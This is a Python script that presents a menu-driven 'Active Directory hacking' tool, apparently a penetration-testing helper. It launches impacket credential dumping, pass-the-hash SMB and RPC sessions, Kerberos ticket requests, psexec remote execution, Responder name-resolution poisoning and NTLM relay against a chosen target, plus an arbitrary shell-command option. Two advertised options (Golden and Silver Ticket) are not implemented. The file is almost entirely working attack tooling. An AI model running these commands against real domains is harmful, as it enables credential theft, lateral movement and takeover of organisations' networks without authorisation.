import subprocess
import os
from utils import string_format, run_task


def check_vars(varList):
    for var in varList:
        if not var:
            print("Required variables are empty")
            return 0

    return 1


def main(resultsPath):
    resultsPath = resultsPath + "ActiveDirectory/"
    os.makedirs(resultsPath, exist_ok=True)

    target = str(input("Target IP: "))
    target_name = str(input("Target Name: "))
    user = str(input("User: "))
    hash = str(input("Hash: "))
    domain = str(input("Domain: "))
    domain_sid = str(input("Domain SID: "))
    subprocess.run(["clear"], shell=True)

    while True:
        print(string_format.title("ACTIVE DIRECTORY HACKING"))

        print(
            string_format.info("\nALL RESULTS WILL BE STORED IN: ")
            + string_format.success(resultsPath)
        )
        print(string_format.info("\nCurrent variables values:\n"))
        print("Target:", string_format.text(target))
        print("User:", string_format.text(user))
        print("Hash:", string_format.text(hash))
        print("Domain:", string_format.text(domain))
        print("Domain SID:", string_format.text(domain_sid))

        try:
            operation = int(
                input(
                    """
[1] Impacket secrets dump from hashfile
[2] Pass the Hash (SMB Client)
[3] Pass the Hash (RPC Client)
[4] Impacket get Ticket Granting Ticket (Hash NTLM)
[5] Impacket secrets dump (TGT Kerberos)
[6] Impacket Poweshell Exec (TGT Kerberos)
[7] Impacket Get Service Ticket (TGT Kerberos)
[8] Make Golden Ticket (own TGT)
[9] Make Silver Ticket (own ST)
[10] LLMNR/NBTNS Poison (get NTLMv2 Hash)
[11] NTLM/SMB Relay
[97] Change variables
[98] Custom command (SHELL)
[99] Exit

Select operation: """
                )
            )
        except:
            operation = 0
        print("\n")
        match operation:
            case 1:
                if check_vars([target_name, user, domain]):
                    run_task.newTerminal(["impacket-secretsdump", domain + "/" + user])
            case 2:
                if check_vars([target, user, hash, domain]):
                    while True:
                        path = str(input("Directory path: "))
                        path = "//" + target + "/" + path

                        print("Complete path: " + path)
                        check = str(input("Is this correct? [y/n/c]: "))
                        if check == "y" or check == "Y":
                            run_task.newTerminal(
                                [
                                    "pth-smbclient",
                                    path,
                                    "-U",
                                    user,
                                    "--pw-nt-hash",
                                    hash,
                                    "-W",
                                    domain,
                                ]
                            )
                            break

                        if check == "c" or check == "C":
                            break

            case 3:
                check_vars([target, user, hash, domain])
                run_task.newTerminal(
                    [
                        "pth-rpcclient",
                        "-U",
                        domain + "/" + user + "%:" + hash,
                        "//" + target,
                    ]
                )

            case 4:
                if check_vars([user, hash, domain]):
                    run_task.newTerminal(
                        [
                            "impacket-getTGT",
                            domain + "/" + user,
                            "-hashes",
                            ":" + hash,
                        ]
                    )

            case 5:
                if check_vars([target_name, domain, user]):
                    run_task.newTerminal(
                        [
                            "impacket-secretsdump",
                            domain + "/" + user + "@" + target_name,
                            "-k",
                            "-no-pass",
                        ]
                    )

            case 6:
                if check_vars([target_name, user, domain]):
                    run_task.newTerminal(
                        [
                            "impacket-psexec",
                            domain + "/" + user + "@" + target_name,
                            "-k",
                            "-no-pass",
                        ]
                    )

            case 7:
                if check_vars([domain, user]):
                    service = str(input("Service name: "))
                    run_task.newTerminal(
                        [
                            "impacket-getST",
                            "-spn",
                            service + "/" + target_name,
                            "-no-pass",
                            "-k",
                            domain + "/" + user,
                        ]
                    )

            case 10:
                interface = str(input("Interface: "))
                run_task.newTerminal(["responder", "-I", interface, "-Pv"])

            case 11:
                network = str(input("Network: "))
                run_task.newTerminal(["crackmapexec", "smb", network])
                print("Generating targets.txt\n")
                f = open(resultsPath + "targets.txt", "w")
                while True:
                    tmp_target = str(input("Target IP: "))
                    f.write(tmp_target + "\n")
                    ans = str(input("Stop? [y/n]: "))
                    if ans == "y" or ans == "Y":
                        break
                f.close()
                run_task.newTerminal(
                    [
                        "impacket-ntlmrelayx",
                        "-smb2support",
                        "-tf",
                        resultsPath + "targets.txt",
                        "-socks",
                    ]
                )
                interface = str(input("Interface: "))
                run_task.newTerminal(["responder", "-I", interface, "-Pv"])

            case 97:
                print(string_format.warning("Empty field = current value \n"))
                target = str(input("Target IP: ") or target)
                target_name = str(input("Target Name: ") or target_name)
                user = str(input("User: ") or user)
                hash = str(input("Hash: ") or hash)
                domain = str(input("Domain: ") or domain)
                domain_sid = str(input("Domain SID: ") or domain_sid)

            case 98:
                print("THIS SECTION DOESN'T MAKE ANY LOG BY DEFAULT")
                print("YOU NEED TO MAKE YOUR OWN LOG\n")
                command = str(input("Command: "))
                run_task.normalShell(command)

            case 99:
                break

            case _:
                print("Invalid option")
        input("\nPress enter to continue ")
        subprocess.run(["clear"], shell=True)
